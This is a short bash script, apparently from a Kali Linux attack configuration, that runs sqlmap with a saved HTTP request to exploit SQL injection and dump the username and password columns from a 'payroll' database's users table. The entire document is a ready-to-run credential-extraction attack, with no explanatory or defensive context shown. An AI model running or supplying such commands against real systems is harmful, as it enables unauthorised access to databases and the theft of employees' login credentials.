#!/bin/bash


sqlmap -r /home/kali/baw-git/attacks_conf/request.txt --batch -D payroll -T users -C username,password --dump
